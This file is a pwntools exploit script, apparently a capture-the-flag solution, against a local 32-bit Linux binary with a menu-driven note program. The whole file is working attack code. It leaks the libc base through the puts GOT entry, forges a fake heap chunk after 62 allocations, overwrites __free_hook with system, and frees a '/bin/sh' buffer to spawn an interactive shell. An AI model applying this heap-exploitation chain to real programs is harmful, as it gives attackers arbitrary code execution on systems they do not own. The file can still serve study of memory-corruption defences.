from pwn import *
context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

sd   = lambda s    : io.send(s)
sa   = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
sh   = lambda 	   : io.interactive()

def debug():
	gdb.attach(io)
	pause()

menu = b'Action:'
def add(name, des):
	sl(b'1')
	sl(name)
	sl(des)	

def dele():
	sl(b'3')

def show():
	sl(b'2')

def mes(mes):
	sl(b'4')
	sl(mes)
	
puts_got = elf.got['puts']
payload = b'A'*27 + p32(puts_got)
add(payload, b'A')
show()

rut(b'Description: ')
rut(b'Description: ')
libc.address = u32(rc(4)) - libc.symbols['puts']
print("libc_base: ", hex(libc.address))

for i in range(62):
	add(b'A', b'A')	

fake_chunk = 0x804A2A8
payload = b'A'*27 + p32(fake_chunk)
add(payload, b'A')

payload = b'\x00'*0x20 + p32(0x60)
mes(payload)
#debug()

dele()

add(b'A', p32(libc.symbols['__free_hook']))
add(b'A', b'/bin/sh\x00')
#debug()
mes(p32(libc.symbols['system']))
#debug()

dele()

sh()
